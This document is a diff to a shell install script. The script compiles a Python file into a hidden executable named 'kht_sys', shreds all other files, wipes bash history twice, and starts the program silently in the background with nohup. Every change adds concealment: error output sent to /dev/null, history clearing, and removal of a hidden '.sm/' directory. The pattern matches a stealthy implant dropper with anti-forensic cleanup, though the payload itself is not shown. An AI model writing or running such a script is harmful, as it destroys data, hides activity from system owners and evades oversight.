@@ -25,18 +25,25 @@ shred -n 64 -u check
 cd ${pth}
 mv kht_sys kht_sys.py
 python3 -OO -m py_compile kht_sys.py
-find . -iname "*.pyc" | sed 's/.*/mv & kht_sys/g' | sh
+find . -iname "*.pyc" | sed 's/.*/mv & kht_sys/g' | sh 2> /dev/null
 chmod 755 kht_sys
-find . -type f \( ! -iname "khc_st" ! -iname "kht_sys" \) | sed 's/.*/shred -n 64 -u &/g' | sh
+find . -type f \( ! -iname "khc_st" ! -iname "kht_sys" \) | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
 rm -fr __pycache__
-cd -
+cd - 2>/dev/null 1>/dev/null
 
-find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh
+find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
+
 
 echo "Done"
 
 history -cw 
-cat /dev/null > ~/.history
+cat /dev/null > ~/.bash_history
 
 nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
+
+cd ../
+rm -fr .sm/
+
+history -cw 
+cat /dev/null > ~/.bash_history
 
